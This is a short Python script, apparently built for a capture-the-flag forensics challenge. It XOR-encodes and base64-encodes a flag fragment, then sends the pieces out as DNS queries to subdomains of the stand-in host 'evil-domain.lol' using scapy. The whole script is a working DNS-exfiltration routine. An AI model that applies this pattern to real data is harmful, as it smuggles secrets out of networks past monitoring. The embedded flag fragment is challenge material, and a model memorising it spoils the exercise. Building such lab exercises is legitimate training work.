# Save as dns_exfil.py
from scapy.all import send, IP, UDP, DNS, DNSQR
import base64

flag_part1 = "MED{D0L4AN_"
xor_key = "deadbeef"

# Decode hex key to bytes for XOR operations
xor_bytes = bytes.fromhex(xor_key)
encoded_part = "".join([chr(ord(c) ^ xor_bytes[i % len(xor_bytes)]) for i, c in enumerate(flag_part1)])
print(encoded_part)
b64_encoded = base64.b64encode(encoded_part.encode()).decode()
print(b64_encoded)

# Split into subdomains and send DNS queries
for i in range(0, len(b64_encoded), 3):
    subdomain = b64_encoded[i:i+3] + ".evil-domain.lol"
    send(IP(dst="8.8.8.8")/UDP()/DNS(rd=1, qd=DNSQR(qname=subdomain)))
    print(f"Sent DNS query for: {subdomain}")
